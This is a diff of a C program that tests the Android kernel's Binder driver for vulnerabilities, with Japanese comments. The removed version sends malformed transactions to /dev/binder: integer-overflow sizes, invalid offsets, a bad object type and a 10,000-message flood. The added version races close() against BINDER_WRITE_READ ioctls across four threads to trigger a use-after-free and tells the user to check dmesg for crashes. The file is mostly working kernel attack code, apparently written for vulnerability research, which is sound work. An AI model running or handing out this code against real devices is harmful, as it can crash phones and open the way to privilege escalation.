@@ -1,7 +1,7 @@
 /*
- * binder_test_limited.c - 制限環境向け Binder 脆弱性検証
- * コンパイル: ndk-build または arm-linux-gnueabihf-gcc -static
- * 実行: adb shell /data/local/tmp/binder_test_limited [test]
+ * binder_race_close.c - close() vs ioctl() 競合テスト (mmap不要)
+ * コンパイル: ndk-build または arm-linux-gnueabihf-gcc -static -pthread
+ * 実行: adb shell /data/local/tmp/binder_race_close
  */
 
 #include <stdio.h>
@@ -11,157 +11,124 @@
 #include <fcntl.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <pthread.h>
 #include <errno.h>
 #include <stdint.h>
 #include <signal.h>
+#include <time.h>
 
-// binder.h は提供されたものをインクルード（定義は同一）
+// 提供された binder.h をインクルード（必須）
 #include "binder.h"
 
 #define BINDER_DEVICE "/dev/binder"
 #define MMAP_SIZE (256 * 1024)
 
 static int binder_fd = -1;
-static void *mmap_addr = NULL;
+static volatile int running = 1;
+static volatile int fd_closed = 0;
 
-static void check(int ret, const char *msg) {
-    if (ret < 0) {
+// エラーチェック（mmap失敗は許容）
+static void check_ioctl(int ret, const char *msg) {
+    if (ret < 0 && errno != ENOMEM && errno != EPERM) {
         perror(msg);
-        exit(1);
+        // 競合テストではエラーが出ても続行
     }
 }
 
-static void open_binder() {
-    binder_fd = open(BINDER_DEVICE, O_RDWR);
-    check(binder_fd, "open");
-    // バージョン確認
-    struct binder_version ver;
-    int ret = ioctl(binder_fd, BINDER_VERSION, &ver);
-    check(ret, "BINDER_VERSION");
-    printf("Binder version: %d\n", ver.protocol_version);
-    // mmap (必須)
-    mmap_addr = mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE,
-                     MAP_SHARED, binder_fd, 0);
-    check(mmap_addr == MAP_FAILED ? -1 : 0, "mmap");
-    printf("mmap at %p\n", mmap_addr);
-}
+// ワーカースレッド: トランザクションを連投
+void *worker_thread(void *arg) {
+    int tid = (int)(intptr_t)arg;
+    printf("[%d] worker started\n", tid);
 
-static void close_binder() {
-    if (mmap_addr) munmap(mmap_addr, MMAP_SIZE);
-    if (binder_fd >= 0) close(binder_fd);
-}
+    // ローカルで binder_fd をコピー（closeされてもこのスレッドの fd はクローズされないが、参照は無効化される）
+    int local_fd = binder_fd;
 
-/* トランザクション送信 (oneway, handle=0) */
-static void send_txn(const void *data, size_t data_size,
-                     const void *offsets, size_t offsets_size) {
-    struct binder_transaction_data tr = {
-        .target.handle = 0,
-        .code = 0x1234,
-        .flags = TF_ONE_WAY,
-        .data_size = data_size,
-        .offsets_size = offsets_size,
-        .data.ptr.buffer = (uintptr_t)data,
-        .data.ptr.offsets = (uintptr_t)offsets,
-    };
+    while (running && !fd_closed) {
+        // BC_TRANSACTION (handle=0, oneway) を構築
+        struct binder_transaction_data tr = {
+            .target.handle = 0,
+            .code = 0xDEAD,
+            .flags = TF_ONE_WAY,
+            .data_size = 0,
+            .offsets_size = 0,
+            .data.ptr.buffer = 0,
+            .data.ptr.offsets = 0,
+        };
 
-    uint32_t cmd = BC_TRANSACTION;
-    struct binder_write_read bwr = {
-        .write_size = sizeof(cmd) + sizeof(tr),
-        .write_consumed = 0,
-        .write_buffer = (uintptr_t)&cmd,
-        .read_size = 0,
-        .read_consumed = 0,
-        .read_buffer = 0,
-    };
-    // write_buffer がコマンド＋データを指すようにする必要があるが、
-    // 実際には contiguous なバッファを作成して渡す。
-    // 簡易のため、ローカルバッファを用意。
-    uint8_t write_buf[sizeof(cmd) + sizeof(tr)];
-    memcpy(write_buf, &cmd, sizeof(cmd));
-    memcpy(write_buf + sizeof(cmd), &tr, sizeof(tr));
-    bwr.write_buffer = (uintptr_t)write_buf;
+        uint32_t cmd = BC_TRANSACTION;
+        uint8_t write_buf[sizeof(cmd) + sizeof(tr)];
+        memcpy(write_buf, &cmd, sizeof(cmd));
+        memcpy(write_buf + sizeof(cmd), &tr, sizeof(tr));
 
-    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
-    if (ret < 0) {
-        perror("ioctl BINDER_WRITE_READ");
-    } else {
-        printf("write_consumed=%llu\n", (unsigned long long)bwr.write_consumed);
+        struct binder_write_read bwr = {
+            .write_size = sizeof(write_buf),
+            .write_consumed = 0,
+            .write_buffer = (uintptr_t)write_buf,
+            .read_size = 0,
+            .read_consumed = 0,
+            .read_buffer = 0,
+        };
+
+        // ioctl 呼び出し (closeと競合させる)
+        int ret = ioctl(local_fd, BINDER_WRITE_READ, &bwr);
+        if (ret < 0) {
+            // エラーは無視（close後に呼ばれるとEBADFなどになる）
+        }
+
+        // 負荷をかけるため delay
+        usleep(10);
     }
-}
 
-/* テスト1: 巨大 data_size (オーバーフロー) */
-static void test_overflow() {
-    printf("=== Test Integer Overflow ===\n");
-    // data_size を 0xFFFFFFFF に設定 (32bit 環境ならオーバーフロー)
-    size_t huge = (size_t)-1;  // 最大値
-    char dummy[8] = {0};
-    send_txn(dummy, huge, NULL, 0);
-    // offsets_size も同様に巨大化
-    send_txn(dummy, 0, dummy, huge);
-    // 両方同時
-    send_txn(dummy, huge, dummy, huge);
-    printf("Overflow test done. Check dmesg for crash.\n");
-}
-
-/* テスト2: 不正オフセット (検証バイパス) */
-static void test_bad_offset() {
-    printf("=== Test Bad Offset ===\n");
-    // データとして flat_binder_object を配置
-    struct flat_binder_object obj = {
-        .hdr.type = BINDER_TYPE_BINDER,
-        .flags = 0,
-        .binder = 0xdeadbeef,
-        .cookie = 0xcafebabe,
-    };
-    // オフセット配列に無効な値を設定 (データサイズを超える)
-    binder_size_t offsets[] = { 0xFFFFFFFF, 0x1000 };
-    send_txn(&obj, sizeof(obj), offsets, sizeof(offsets));
-
-    // アライメント不正
-    offsets[0] = 1;  // 4バイトアライメント違反
-    send_txn(&obj, sizeof(obj), offsets, sizeof(offsets));
-
-    // オブジェクトタイプ不正
-    struct binder_object_header bad = { .type = 0xDEAD };
-    send_txn(&bad, sizeof(bad), offsets, sizeof(offsets));
-    printf("Bad offset test done.\n");
-}
-
-/* テスト3: リソース枯渇 (連続送信) */
-static void test_dos() {
-    printf("=== Test DoS (many oneway) ===\n");
-    char data[64] = {0};
-    for (int i = 0; i < 10000; i++) {
-        send_txn(data, sizeof(data), NULL, 0);
-        if (i % 1000 == 0) printf("sent %d\n", i);
-    }
-    printf("DoS test done. Check system responsiveness.\n");
-}
-
-/* テスト4: 複合 (すべて実行) */
-static void test_all() {
-    test_overflow();
-    test_bad_offset();
-    test_dos();
+    printf("[%d] worker stopped\n", tid);
+    return NULL;
 }
 
 int main(int argc, char **argv) {
-    if (argc < 2) {
-        fprintf(stderr, "Usage: %s [overflow|badoffset|dos|all]\n", argv[0]);
+    int ret;
+
+    printf("=== Binder close() vs ioctl() Race Test ===\n");
+
+    // 1. binder オープン
+    binder_fd = open(BINDER_DEVICE, O_RDWR);
+    if (binder_fd < 0) {
+        perror("open binder");
         return 1;
     }
+    printf("binder_fd = %d\n", binder_fd);
 
-    open_binder();
-
-    const char *test = argv[1];
-    if (strcmp(test, "overflow") == 0) test_overflow();
-    else if (strcmp(test, "badoffset") == 0) test_bad_offset();
-    else if (strcmp(test, "dos") == 0) test_dos();
-    else if (strcmp(test, "all") == 0) test_all();
-    else {
-        fprintf(stderr, "Unknown test: %s\n", test);
+    // 2. mmap 試行 (失敗しても構わない)
+    void *map = mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE,
+                     MAP_SHARED, binder_fd, 0);
+    if (map == MAP_FAILED) {
+        perror("mmap (ignored)");
+        // 失敗しても続行
+    } else {
+        printf("mmap succeeded at %p\n", map);
     }
 
-    close_binder();
+    // 3. ワーカースレッドを起動 (4つ)
+    pthread_t threads[4];
+    for (int i = 0; i < 4; i++) {
+        pthread_create(&threads[i], NULL, worker_thread, (void*)(intptr_t)(i+1));
+    }
+
+    // 4. 少し待ってから close() を呼び出し、競合を発生させる
+    printf("Sleeping 1s before close()...\n");
+    sleep(1);
+
+    printf("Calling close(binder_fd) ...\n");
+    fd_closed = 1;  // フラグ設定
+    close(binder_fd);
+    binder_fd = -1;
+
+    // 5. ワーカースレッドの終了を待つ
+    running = 0;
+    for (int i = 0; i < 4; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("Test finished. Check dmesg for kernel crash or UAF traces.\n");
     return 0;
 }
